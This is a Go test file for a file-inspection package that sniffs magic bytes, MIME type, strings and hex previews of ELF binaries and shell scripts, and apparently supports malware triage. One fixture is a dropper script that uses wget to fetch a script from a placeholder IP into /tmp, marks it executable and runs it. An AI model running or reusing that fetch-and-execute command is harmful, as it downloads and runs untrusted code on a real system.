package payload

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeTemp(t *testing.T, name string, body []byte) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(p, body, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestSniffShellScript(t *testing.T) {
	body := []byte("#!/bin/bash\nwget http://1.2.3.4/x.sh -O /tmp/x\nchmod +x /tmp/x\n/tmp/x\n")
	insp := File(writeTemp(t, "x.sh", body))
	if insp.Error != "" {
		t.Fatal(insp.Error)
	}
	if !strings.HasPrefix(insp.Magic, "shebang:") {
		t.Errorf("Magic=%q want shebang: prefix", insp.Magic)
	}
	if insp.MimeHint != "text/x-shellscript" {
		t.Errorf("MimeHint=%q", insp.MimeHint)
	}
	if len(insp.Strings) < 2 {
		t.Errorf("strings count=%d want >=2", len(insp.Strings))
	}
	if !strings.Contains(insp.HexPreview, "|#!/bin/bash") {
		t.Errorf("hex preview missing shebang ASCII column: %q", insp.HexPreview)
	}
}

func TestSniffELF(t *testing.T) {
	body := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, []byte("\x00\x00\x00\x00\x00\x00\x00\x00")...)
	// add some real-looking strings to make sure they get extracted
	body = append(body, []byte("/lib64/ld-linux-x86-64.so.2\x00GLIBC_2.2.5\x00")...)
	insp := File(writeTemp(t, "blob.bin", body))
	if insp.Error != "" {
		t.Fatal(insp.Error)
	}
	if insp.Magic != "ELF64" {
		t.Errorf("Magic=%q want ELF64", insp.Magic)
	}
	foundLD := false
	for _, s := range insp.Strings {
		if strings.Contains(s, "/lib64/ld-linux-x86-64.so.2") {
			foundLD = true
		}
	}
	if !foundLD {
		t.Errorf("ld string not surfaced: %+v", insp.Strings)
	}
}

func TestMissingFile(t *testing.T) {
	insp := File("/nonexistent/path/does/not/exist")
	if insp.Error == "" {
		t.Errorf("expected error for missing file")
	}
	if insp.Magic != "" {
		t.Errorf("magic should not be inferred for missing file: %q", insp.Magic)
	}
}

func TestEmptyPath(t *testing.T) {
	insp := File("")
	if insp.Error == "" {
		t.Errorf("expected error for empty path")
	}
}
